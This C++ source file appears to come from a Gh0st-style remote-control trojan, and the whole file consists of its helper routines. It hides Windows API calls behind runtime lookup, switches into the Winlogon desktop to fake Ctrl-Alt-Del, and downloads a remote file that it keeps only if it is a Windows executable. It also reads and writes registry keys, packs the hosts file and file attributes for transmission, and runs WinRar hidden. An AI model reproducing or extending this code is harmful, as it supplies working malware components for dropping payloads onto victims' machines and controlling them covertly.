#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED
#include <afxwin.h>
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include <wininet.h>
#include "until.h"



unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#if _DLL
 	try
 	{	
#endif
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与卓面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);
		nRet = arg.start_address(arg.arglist);
#if _DLL
	}catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId,
					   bool bInteractive)

{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);
	
	return hThread;
}

BOOL SimulateCtrlAltDel()
{
	//////////////////////////////////////////////////////////////////////////
	HINSTANCE user32 = LoadLibrary("user32.dll");

	typedef HDESK (WINAPI *TGetThreadDesktop)(DWORD); 
	typedef BOOL (WINAPI *TPostMessageA)(HWND,UINT,WPARAM,LPARAM); 
	
	TGetThreadDesktop MyGetThreadDesktop= (TGetThreadDesktop)GetProcAddress(user32, "GetThreadDesktop"); 
	TPostMessageA MyPostMessage= (TPostMessageA)GetProcAddress(user32, "PostMessageA");
	//////////////////////////////////////////////////////////////////////////
	BOOL   iResult = TRUE;
	__try
	{
		
		HDESK old_desktop = MyGetThreadDesktop(GetCurrentThreadId());
		
		// Switch into the Winlogon desktop
		if (!SelectDesktop("Winlogon"))
		{
			iResult = FALSE;
			__leave;
		}
		
		// Fake a hotkey event to any windows we find there.... :(
		// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
		MyPostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
		
		// Switch back to our original desktop
		if (old_desktop != NULL)
			SelectHDESK(old_desktop);
	}	__finally 
	{
		if (user32)
			FreeLibrary(user32);
	}
	
	
	return iResult;
}


BOOL SelectHDESK(HDESK new_desktop)
{
	//////////////////////////////////////////////////////////////////////////
	HINSTANCE user32 = LoadLibrary("user32.dll");
	
	typedef HDESK (WINAPI *TGetThreadDesktop)(DWORD); 
	typedef BOOL (WINAPI *TGetUserObjectInformationA)(HANDLE,int,PVOID,DWORD,LPDWORD); 
	typedef BOOL (WINAPI *TSetThreadDesktop)(HDESK); 
	typedef BOOL (WINAPI *TCloseDesktop)(HDESK); 
	
	TGetThreadDesktop MyGetThreadDesktop= (TGetThreadDesktop)GetProcAddress(user32, "GetThreadDesktop"); 
	TGetUserObjectInformationA MyGetUserObjectInformation= (TGetUserObjectInformationA)GetProcAddress(user32, "GetUserObjectInformationA");
	TSetThreadDesktop MySetThreadDesktop= (TSetThreadDesktop)GetProcAddress(user32, "SetThreadDesktop");
	TCloseDesktop MyCloseDesktop= (TCloseDesktop)GetProcAddress(user32, "CloseDesktop"); 
	//////////////////////////////////////////////////////////////////////////
	
	HDESK old_desktop = MyGetThreadDesktop(GetCurrentThreadId());
	
	DWORD dummy;
	char new_name[256];

	BOOL   iResult = TRUE;
	__try
	{
		
		if (!MyGetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy))
		{
			iResult = FALSE;
			__leave;
		}
		
		// Switch the desktop
		if(!MySetThreadDesktop(new_desktop)) 
		{
			iResult = FALSE;
			__leave;
		}
		
		// Switched successfully - destroy the old desktop
		MyCloseDesktop(old_desktop);

	}__finally
	{
		if(user32)
			FreeLibrary(user32);
	}
	
	return iResult;
}

BOOL SelectDesktop(TCHAR *name)
{
	//////////////////////////////////////////////////////////////////////////
	HINSTANCE user32 = LoadLibrary("user32.dll");
	
	typedef HDESK (WINAPI *TOpenDesktopA)(LPCSTR,DWORD,BOOL,ACCESS_MASK); 
	typedef HDESK (WINAPI *TOpenInputDesktop)(DWORD,BOOL,ACCESS_MASK); 
	typedef BOOL (WINAPI *TCloseDesktop)(HDESK); 
	
	TOpenInputDesktop MyOpenInputDesktop= (TOpenInputDesktop)GetProcAddress(user32, "OpenInputDesktop"); 
	TOpenDesktopA MyOpenDesktop= (TOpenDesktopA)GetProcAddress(user32, "OpenDesktopA"); 
	TCloseDesktop MyCloseDesktop= (TCloseDesktop)GetProcAddress(user32, "CloseDesktop"); 
	//////////////////////////////////////////////////////////////////////////
	HDESK desktop;
	
	BOOL   iResult = TRUE;
	__try
	{
		
		if (name != NULL)
		{
			// Attempt to open the named desktop
			desktop = MyOpenDesktop(name, 0, FALSE,0x1FF);
		}
		else
		{
			// No, so open the input desktop
			desktop = MyOpenInputDesktop(0, FALSE,0x1FF);
		}
		
		// Did we succeed?
		if (desktop == NULL) 
		{
			iResult = FALSE;
			__leave;
		}
		
		// Switch to the new desktop
		if (!SelectHDESK(desktop)) 
		{
			// Failed to enter the new desktop, so free it!
			MyCloseDesktop(desktop);
			iResult =  FALSE;
			__leave;
		}
	}__finally
	{
		if(user32)
			FreeLibrary(user32);
	}
	
	return iResult;
}


bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet = NULL, hUrl = NULL;
	HANDLE		hFile;
	TCHAR		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	bool		bRet = true;

	HINSTANCE hdlldes = LoadLibrary("wininet.dll"); 
	
	typedef HINTERNET (WINAPI *NETOPEN)(LPCTSTR ,DWORD, LPCTSTR, LPCTSTR ,DWORD) ; 
	NETOPEN myNetOpen= (NETOPEN)GetProcAddress(hdlldes, "InternetOpenA");

	hInternet = myNetOpen("MSIE 6.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	
	if (hInternet == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	
	typedef HINTERNET (WINAPI *NETOPENURL)(HINTERNET ,LPCTSTR ,LPCTSTR ,DWORD ,DWORD ,DWORD_PTR ); 
	NETOPENURL 	myNetOpenUrl= (NETOPENURL)GetProcAddress(hdlldes, "InternetOpenUrlA");
	
	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	
	
	if (hUrl == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			typedef BOOL (WINAPI *APIS)(HINTERNET ,LPVOID ,DWORD ,LPDWORD ); 
			APIS myapis; 
			myapis= (APIS)GetProcAddress(hdlldes, "InternetReadFile"); 
			myapis(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			
			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;
			
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}
	
	typedef BOOL (WINAPI *NETCLOSE)(HINTERNET hInternet); 
	NETCLOSE  myNetClose= (NETCLOSE  )GetProcAddress(hdlldes,"InternetCloseHandle"); 
	
	myNetClose(hUrl);
	myNetClose(hInternet);

	if(hdlldes)
			FreeLibrary(hdlldes);
	
	return bRet;
}


char *DelSpace(char *szData)
{
	int i=0 ;
	while(1)
	{
		if(strnicmp(szData+i," ",1))
			break;
		i++;
	}
	return (szData+i);
} 
#include <STDIO.H>
//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键 2-牧举指定键项 3-判断该键是否存在)
int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
{   
	HKEY   hKey;  
	int    ValueDWORD,iResult=0;
	char*  PointStr;  
	char   KeyName[32],ValueSz[MAX_PATH],ValueTemp[MAX_PATH];	
	DWORD  szSize,KnSize,dwIndex=0;	 

	memset(KeyName,0,sizeof(KeyName));
	memset(ValueSz,0,sizeof(ValueSz));
	memset(ValueTemp,0,sizeof(ValueTemp));

//////////////////////////////////////////////////////////////////////////
	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

	typedef BOOL (WINAPI *TRegQueryValueExA)(HKEY ,LPCTSTR ,LPDWORD ,LPDWORD ,LPBYTE ,LPDWORD );
	typedef int (WINAPI *TRegOpenKeyExA)(HKEY ,LPCTSTR ,DWORD ,REGSAM ,PHKEY );
	typedef BOOL (WINAPI *TRegEnumValueA)(HKEY ,DWORD ,LPTSTR ,LPDWORD ,LPDWORD ,LPDWORD ,LPBYTE ,LPDWORD ); 
	typedef BOOL (WINAPI *TRegEnumKeyExA)(HKEY ,DWORD ,LPTSTR ,LPDWORD ,LPDWORD ,LPTSTR ,LPDWORD ,PFILETIME ); 
	typedef BOOL (WINAPI *TRegCloseKey)(HKEY ); 


	TRegQueryValueExA MyRegQueryValueEx = (TRegQueryValueExA)GetProcAddress(advapi32, "RegQueryValueExA");
	TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
	TRegEnumValueA MyRegEnumValue= (TRegEnumValueA)GetProcAddress(advapi32, "RegEnumValueA");
	TRegEnumKeyExA MyRegEnumKeyEx= (TRegEnumKeyExA)GetProcAddress(advapi32, "RegEnumKeyExA");
	TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
//////////////////////////////////////////////////////////////////////////
	
		 
	__try
	{	    	
		if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ,&hKey) != ERROR_SUCCESS)
		{
            iResult = -1;
			__leave;
		}
		switch(Mode)		 
		{
		case 0:
			switch(Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:				 
				szSize = sizeof(ValueSz);
				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					lstrcpy(szData,ValueSz);
					iResult =1;
				}
				break;
			case REG_MULTI_SZ:	
				szSize = sizeof(ValueSz);
				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					for(PointStr = ValueSz; *PointStr; PointStr = strchr(PointStr,0)+1)//strchr
					{
						strncat(ValueTemp,PointStr,sizeof(ValueTemp));
					    strncat(ValueTemp," ",sizeof(ValueTemp));
					}
					lstrcpy(szData,ValueTemp);
					iResult =1;
				}
				break;				 			
			case REG_DWORD:
				szSize = sizeof(DWORD);

				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)&ValueDWORD,&szSize ) == ERROR_SUCCESS)						
				{
					wsprintf(szData,"%d",ValueDWORD);
					iResult =1;
				}
				break;
            case REG_BINARY:
                szSize = lbSize;

				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,szBytes,&szSize) == ERROR_SUCCESS)
				{
					wsprintf(szData,"%08X",Type);
					iResult =1;
				}
				break;
			}
			break;
		case 1:
			while(1)
			{				 
				memset(ValueSz,0,sizeof(ValueSz));
				szSize   = sizeof(ValueSz);

                if(MyRegEnumKeyEx(hKey,dwIndex++,ValueSz,&szSize,NULL,NULL,NULL,NULL) != ERROR_SUCCESS)
					break;
                wsprintf(ValueTemp,"[%s]\r\n",ValueSz);
				lstrcat(szData,ValueTemp);
				iResult =1;
			}			 
			break;
		case 2:			  
			while(1)
			{				 
				memset(KeyName,0,sizeof(KeyName));
				memset(ValueSz,0,sizeof(ValueSz));
				memset(ValueTemp,0,sizeof(ValueTemp));
				KnSize = sizeof(KeyName);
                szSize = sizeof(ValueSz);

                if(MyRegEnumValue(hKey,dwIndex++,KeyName,&KnSize,NULL,&Type,(LPBYTE)ValueSz,&szSize) != ERROR_SUCCESS)
					break;
				switch(Type)				 				
				{				     
				case REG_SZ:					 						 
					wsprintf(ValueTemp,"%-24s %-15s %s \r\n",KeyName,"REG_SZ",ValueSz);					     
					break;
				case REG_EXPAND_SZ:                   						 
					wsprintf(ValueTemp,"%-24s %-15s %s \r\n",KeyName,"REG_EXPAND_SZ",ValueSz);
					break;
				case REG_DWORD:
					wsprintf(ValueTemp,"%-24s %-15s 0x%x(%d) \r\n",KeyName,"REG_DWORD",ValueSz,int(ValueSz));
					break;
				case REG_MULTI_SZ:
                    wsprintf(ValueTemp,"%-24s %-15s \r\n",KeyName,"REG_MULTI_SZ");
					break;
			    case REG_BINARY:
					wsprintf(ValueTemp,"%-24s %-15s \r\n",KeyName,"REG_BINARY");
					break;
				}
				lstrcat(szData,ValueTemp);
				iResult =1;
			}
			break;
		case 3:
            iResult =1;
			break;
		}
	}
	__finally
	{
        MyRegCloseKey(MainKey);
		MyRegCloseKey(hKey);
	}
	if(advapi32)
		FreeLibrary(advapi32);
     
	return iResult;
}

//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
{
	HKEY  hKey; 
	DWORD dwDisposition;    
	int   iResult =0;
////////////////////////////////////////////////////////////////////////
	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

	typedef LONG (WINAPI *TRegCreateKeyExA)(HKEY ,LPCSTR ,DWORD ,LPSTR ,DWORD ,REGSAM ,LPSECURITY_ATTRIBUTES ,PHKEY ,LPDWORD ); 
	typedef LONG (WINAPI *TRegSetValueExA)(HKEY ,LPCSTR ,DWORD ,DWORD ,CONST BYTE *,DWORD ); 
	typedef LONG (WINAPI *TRegDeleteKeyA)(HKEY ,LPCSTR ); 
	typedef LONG (WINAPI *TRegDeleteValueA)(HKEY ,LPCSTR ); 
	typedef LONG (WINAPI *TRegOpenKeyExA)(HKEY ,LPCSTR ,DWORD ,REGSAM ,PHKEY ); 
	typedef LONG (WINAPI *TRegCloseKey)(HKEY ); 

	TRegCreateKeyExA MyRegCreateKeyEx= (TRegCreateKeyExA)GetProcAddress(advapi32, "RegCreateKeyExA");
	TRegSetValueExA MyRegSetValueEx = (TRegSetValueExA)GetProcAddress(advapi32, "RegSetValueExA");
	TRegDeleteKeyA MyRegDeleteKey = (TRegDeleteKeyA)GetProcAddress(advapi32, "RegDeleteKeyA");
	TRegDeleteValueA MyRegDeleteValue= (TRegDeleteValueA)GetProcAddress(advapi32, "RegDeleteValueA");
	TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
	TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey"); 
////////////////////////////////////////////////////////////////////////

	
	__try
	{	
	//	SetKeySecurityEx(MainKey,Subkey,KEY_ALL_ACCESS);
		switch(Mode)		
		{			
		case 0:
			if(MyRegCreateKeyEx(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS)
				__leave;		 
		case 1:	
			if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)	
				__leave;		 		 			 
			switch(Type)
			{		 
			case REG_SZ:		 
			case REG_EXPAND_SZ:	
			case REG_MULTI_SZ:
			if(MyRegSetValueEx(hKey,Vname,0,Type,(LPBYTE)szData,lstrlen(szData)+1) == ERROR_SUCCESS)
					iResult =1;				 			
				break;
		    case REG_DWORD:
                if(MyRegSetValueEx(hKey,Vname,0,Type,(LPBYTE)&dwData,sizeof(DWORD)) == ERROR_SUCCESS)  
		            iResult =1;				 			 
			    break;
		    case REG_BINARY:
			    break;
			}
			break;				
		case 2:
            if(MyRegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (MyRegDeleteKey(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;		
		case 3:
            if(MyRegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)	
				__leave;                
			if (MyRegDeleteValue(hKey,Vname) == ERROR_SUCCESS)	
				iResult =1;
			break;
		default:
			__leave;                

		}
	}
	__finally 
	{
	   MyRegCloseKey(MainKey);		
	   MyRegCloseKey(hKey);
	}
	if(advapi32)
		FreeLibrary(advapi32);
	return iResult;
}

//获取Host文件
LPBYTE getHostsList(BYTE szByte)
{
	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024); 
	lpBuffer[0] = szByte;
	CString strPath;  
    CString  strWindows;
	TCHAR	strSystem[MAX_PATH];
    GetSystemDirectory(strSystem, MAX_PATH);  
    GetWindowsDirectory(strWindows.GetBuffer(32), 32);  
    TCHAR szDriver[5] = {0};  
    RtlCopyMemory(szDriver, strWindows.GetBuffer(1), 3*sizeof(TCHAR));  
    szDriver[3] = 0;  
    strPath.Format("%s\\drivers\\etc\\hosts", strSystem);     
    CStdioFile sf;     
    CFileException e;   
    CString strSign, strTemp, strFile;  
    BOOL bOpen = sf.Open(strPath, CFile::typeText|CFile::modeRead, &e);  
    if(bOpen)    
    {         
        int cnt = 0;  
        while(sf.ReadString(strSign) != NULL)  
        {  
            cnt++;
            strFile += strSign;  
            strFile += "\r\n";         
            strTemp.Format("%d", cnt);  
			
        }  
        sf.Close();  
    }  
	// 缓冲区太小，再重新分配下
	dwLength = lstrlen(strFile) + 6;
	if (LocalSize(lpBuffer) < (dwOffset + dwLength))
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
	memcpy(lpBuffer + dwOffset, strFile, lstrlen(strFile) + 1);
	dwOffset += lstrlen(strFile) + 1;	
	
	return lpBuffer;	
}
//获取文件属性
LPBYTE GetFileAttr(BYTE szByte , LPCSTR FilePath)
{
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, sizeof(CFileStatus) + 1);
	
	lpBuffer[0] = szByte;
	CFileStatus rStatus;//结构体
	CFile::GetStatus(FilePath,rStatus); //获取文件属性
	
	memcpy(lpBuffer + 1, &rStatus, sizeof(CFileStatus)); //组合文件属性
	
	return lpBuffer;
}
//压缩解压文件
void RarComPress(LPCSTR buff)
{
	ShellExecute(NULL,"open","WinRar",buff,"",SW_HIDE);
}
#endif // !defined(AFX_UNTIL_CPP_INCLUDED)